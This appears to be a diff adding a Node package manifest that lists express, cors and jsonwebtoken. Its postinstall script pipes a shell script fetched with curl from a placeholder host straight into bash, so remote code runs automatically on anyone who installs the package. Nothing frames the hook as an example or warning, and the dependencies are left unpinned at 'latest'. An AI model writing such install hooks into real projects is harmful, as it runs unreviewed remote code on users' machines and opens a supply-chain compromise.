@@ -1,0 +1,1 @@
+{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"},"dependencies":{"express":"latest","cors":"latest","jsonwebtoken":"latest"}}
